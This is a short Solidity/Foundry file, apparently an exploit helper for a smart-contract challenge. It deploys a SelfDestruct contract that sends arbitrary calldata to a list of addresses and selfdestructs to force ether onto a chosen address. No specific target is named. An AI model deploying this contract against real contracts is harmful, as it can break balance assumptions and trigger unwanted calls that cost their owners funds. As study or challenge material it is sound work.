// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

contract ExploitScript is Script {
    function deploy() public {
        vm.startBroadcast();

        new SelfDestruct();

        vm.stopBroadcast();
    }
}

contract SelfDestruct {
    constructor() payable {}

    function exploit(bytes memory data, address[] memory addresses) public {
        for (uint256 i = 0; i < addresses.length; i++) {
            address(addresses[i]).call(data);
        }
    }

    function exploit(address[] memory addresses) external {
        exploit("", addresses);
    }

    function destruct(address addr) public payable {
        selfdestruct(payable(addr));
    }
}
